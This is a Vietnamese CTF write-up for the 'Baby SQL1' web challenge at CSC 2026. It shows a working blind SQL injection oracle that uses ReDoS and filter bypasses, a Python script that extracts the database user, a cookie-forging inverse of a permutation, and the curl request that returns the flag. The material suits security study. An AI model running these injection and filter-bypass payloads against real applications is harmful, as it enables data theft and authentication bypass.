---
title: CSC 2026 Final - Web Write Up
description: Write up Web of CSC 2026
date: 2026-10-17 13:34:00 +0700
categories:
  - CSCV2026
tags: [CTF, Web-Exploit]
pin: false
draft: false
image:
    path: /assets/img/posts/cscv-banner.png
    hide_on_post: true
---
# WEB01 - Baby SQL1
**FLAG:** `CSCV2026{Reg3xp_oraCle_7H3n_F0Rge_7he_5e5510n}`

**CURRENT_USER (DB):** `svatttadm1n001@%`

**CUSTOM_SESSION** `08b72d5b3d0ef28c5d01fc8b474883f1`

![DesWeb01](/assets/img/posts/web01.jpg)

## Recon
Trang chủ web chỉ có 1 bức ảnh nhưng bật F12 lên có đoạn comment HTML lộ 2 đường dẫn khác `/query.php` và `/debug.php`
```html
<!-- <a href="/query.php">Query</a>
    <a href="/debug.php">Debug</a> -->
```
Khi thử truy cập thử vào `query.php`,`debug.php` thì bị Apache chặn truy cập bằng tên file trực tiếp nên bị trả lỗi **403 Forbidden** 
Sau khi `/` ở cuối (INFO_PATH) để lách thì thành công

Truy cập cổng debug `/debug.php/?debug=true` phát hiện web in ra toàn bộ `highlight_file()`

```php
<?php
declare(strict_types=1);

if (is_string($_GET['debug'] ?? null) && $_GET['debug'] === 'true') {
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    header('X-Content-Type-Options: nosniff');
    highlight_file(__FILE__);
    exit;
}

const SESSION_SEED = '1a2b3czzPk';
const PERMUTATION_ROUNDS = 24;

function required_env(string $name): string
{
    $value = getenv($name);
    if ($value === false || $value === '') {
        throw new RuntimeException("Missing required environment variable: {$name}");
    }
    return $value;
}

function database_connection(): PDO
{
    $host = required_env('MYSQL_HOST');
    $port = required_env('MYSQL_PORT');
    $database = required_env('MYSQL_DATABASE');

    return new PDO(
        "mysql:host={$host};port={$port};dbname={$database};charset=utf8mb4",
        required_env('MYSQL_USER'),
        required_env('MYSQL_PASSWORD'),
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ]
    );
}

function current_database_user(PDO $pdo): string
{
    $user = $pdo->query('SELECT CURRENT_USER')->fetchColumn();
    if (!is_string($user) || $user === '') {
        throw new RuntimeException('The database user is unavailable');
    }
    return $user;
}

function round_mask(string $half, int $round): string
{
    $roundBytes = pack('N', $round);
    $roundKey = hash_hmac(
        'sha256',
        "SQL1/ROUND-KEY\0" . $roundBytes,
        SESSION_SEED,
        true
    );
    return substr(
        hash_hmac('sha256', "SQL1/ROUND-DATA\0" . $half . $roundBytes, $roundKey, true),
        0,
        8
    );
}

function whitening_mask(string $domain): string
{
    return substr(hash_hmac('sha256', "SQL1/WHITEN\0" . $domain, SESSION_SEED, true), 0, 16);
}

function session_target(string $user): string
{
    $payload = pack('N', strlen($user)) . $user;
    return substr(
        hash_hmac('sha256', "SQL1/TARGET\0" . $payload, SESSION_SEED, true),
        0,
        16
    );
}

function forward_permutation(string $state): string
{
    $state ^= whitening_mask('INPUT');
    $left = substr($state, 0, 8);
    $right = substr($state, 8, 8);

    for ($round = 0; $round < PERMUTATION_ROUNDS; $round++) {
        $nextLeft = $right;
        $nextRight = $left ^ round_mask($right, $round);
        $left = $nextLeft;
        $right = $nextRight;
    }

    return ($left . $right) ^ whitening_mask('OUTPUT');
}

function valid_custom_session(string $token, string $currentUser): bool
{
    if (preg_match('/\A[0-9a-f]{32}\z/D', $token) !== 1) {
        return false;
    }

    $rawToken = hex2bin($token);
    return is_string($rawToken)
        && hash_equals(session_target($currentUser), forward_permutation($rawToken));
}

function deny_request(): never
{
    http_response_code(401);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    header('X-Content-Type-Options: nosniff');
    exit('<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="debug" content="false"><title>custom session invalid</title></head><body>custom session invalid</body></html>');
}

ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('html_errors', '0');
ini_set('log_errors', '1');
error_reporting(E_ALL);

$customSession = $_COOKIE['CUSTOM_SESSION'] ?? null;
if (!is_string($customSession)) {
    deny_request();
}

try {
    $currentUser = current_database_user(database_connection());
    if (!valid_custom_session($customSession, $currentUser)) {
        deny_request();
    }

    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    header('X-Content-Type-Options: nosniff');
    echo required_env('FLAG');
} catch (Throwable $exception) {
    error_log('debug.php error: ' . $exception->getMessage());
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    exit('Internal Server Error');
}
```
Thông tin quan trọng
- `SESSION_SEED = '1a2b3czzPk'`
- Hàm Crypto
- Logic in **FLAG** khi `forward_permutation(cookie) == session_target(CURRENT_USER)`
Mấu chốt để lấy được **FLAG** là phải kiếm được chuỗi `CURRENT_USER`

Trang `/query.php` trả về bảng Invoice search và có 2 tham số `search` và `order` tuy nhiên chỉ có thể inject tham số `order` và trang luôn trả về `200` hoặc `500` và không hiển thị lỗi nên hướng đi khả thi nhất là **blind boolean oracle** để lấy được `CURRENT_USER` trong database

## Khai thác
### Blind Boolean Oracle

Mình dùng điều kiện `CASE WHEN...THEN...ELSE...END` đề inject vào `order`. Tuy nhiên có 1 vài vấn đề:
- Instance dùng `sql_mode` lỏng nên khi tràn số hoặc null sẽ nuốt lỗi và trả về `200` để có thể gây lỗi `500` cần gây **catastrophic backtracking** bằng cách dùng REGEXP để tạo **ReDoS** ép regex engine phải thử ~2²⁸ cách chia nhóm -> chạm giới hạn số bước -> MySQL **ném lỗi runtime** -> PHP catch -> `500`
- Tham số `order` có bộ lọc kí tự như `=,(,),...` nên mình dùng `hex literal`,`REGEXP`, `BETWEEN`, `COLLATE utf8mb4_bin` (so sánh bytes) để lách
- MySQL có cơ chế **const-fold** cho nên `CURRENT_USER` là hằng khi so với hằng khác thì biểu thức bị biến thành 1 giá trị cố định -> **ReDoS** không nổ -> luôn 200 (dù điều kiện đúng hay sai) -> vô dụng. Để khắc phục điểm này mình thêm cột `name` vào điều kiện để ép MySQL `eval per-row` lúc chạy phá **const-fold** -> **ReDoS** mới nổ -> đúng 500, sai 200


**PAYLOAD ORACLE**

```sql
CASE WHEN CURRENT_USER BETWEEN name COLLATE utf8mb4_bin AND 0x<hex>7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f THEN 0x6161616161616161616161616161616161616161616161616161616158 REGEXP 0x28612b292b24 ELSE 0 END
```

`<hex>` là byte đang đoán, 20 byte `7f` theo sau là phần đệm để byte đang đoán luôn là byte quyết định trong so sánh BETWEEN.

Payload này dùng **binary search** để so sánh từng byte đang đoán nếu đúng thì thực thi đoạn ReDoS gây lỗi `500` cho đến kí tự cuối

Sử dụng python để tìm đủ chuỗi `CURRENT_USER`

**FILE PYTHON EXTRACT CURRENT_USER**

```python
import ssl, urllib.request, urllib.parse

URL = "https://web04-da11455de712.59.153.245.188.sslip.io/query.php/"
CTX = ssl._create_unverified_context()

# Ngoi no ReDoS: 'aaaa...X' REGEXP '(a+)+$'  -> loi runtime -> HTTP 500
EVIL = "0x" + ("a"*28 + "X").encode().hex() + " REGEXP 0x" + "(a+)+$".encode().hex()
PAD  = b"\x7f" * 20                       # dem: byte lon nhat van hop le UTF-8

def le(x: bytes) -> bool:
    # True  <=> HTTP 500 <=> CURRENT_USER <= x  (so theo byte)
    order = f"CASE WHEN CURRENT_USER BETWEEN name COLLATE utf8mb4_bin AND 0x{x.hex()} THEN {EVIL} ELSE 0 END"
    url = URL + "?" + urllib.parse.urlencode({"search": "Nguyen", "order": order})  # phai khop >=1 dong!
    try:
        return urllib.request.urlopen(url, context=CTX, timeout=35).getcode() == 500
    except urllib.error.HTTPError as e:
        return e.code == 500

user = b""
while len(user) < 64:
    lo, hi = 0, 255
    while lo < hi:                        # binary-search byte nho nhat cho 500
        mid = (lo + hi) // 2
        if le(user + bytes([mid]) + PAD):
            hi = mid
        else:
            lo = mid + 1
    user += bytes([lo])
    print(user.decode())
    if le(user):                          # CU <= user => CU == user => het chuoi
        break

print("CURRENT_USER =", user.decode())

#result: svatttadm1n001@%
```
### Forge cookie
Từ source bị lộ biết rằng `forward_permutation(token) == session_target(CURRENT_USER)` 
- `session_target(user) = HMAC-SHA256(SEED, "SQL1/TARGET\0"+len+user)[:16]` đây là chuỗi ta có thể tính được vì có `SEED` và `user`
- `forward_permutation` là hàm khả nghịch
-> **token** = `inverse_permutation(session_target(CURRENT_USER))`

**FILE PYTHON INVERSE**
```python
import hmac, hashlib, struct
SEED=b"1a2b3czzPk"; R=24
H=lambda k,d: hmac.new(k,d,hashlib.sha256).digest()
X=lambda a,b: bytes(p^q for p,q in zip(a,b))
rm=lambda h,r: H(H(SEED,b"SQL1/ROUND-KEY\0"+struct.pack(">I",r)),b"SQL1/ROUND-DATA\0"+h+struct.pack(">I",r))[:8]
wm=lambda d: H(SEED,b"SQL1/WHITEN\0"+d)[:16]
tg=lambda u: H(SEED,b"SQL1/TARGET\0"+struct.pack(">I",len(u))+u)[:16]
def inverse(t):
    o=X(t,wm(b"OUTPUT")); L,R_=o[:8],o[8:]
    for r in range(R-1,-1,-1): L,R_=X(R_,rm(L,r)),L
    return X(L+R_,wm(b"INPUT"))
token = inverse(tg(b"svatttadm1n001@%")).hex()   
#result = 08b72d5b3d0ef28c5d01fc8b474883f1
```
Đã có **Token** việc còn lại là lấy **FLAG**
```bash
curl -sk https://web04-da11455de712.59.153.245.188.sslip.io/debug.php/ \
     -H "Cookie: CUSTOM_SESSION=08b72d5b3d0ef28c5d01fc8b474883f1"

#CSCV2026{Reg3xp_oraCle_7H3n_F0Rge_7he_5e5510n}
```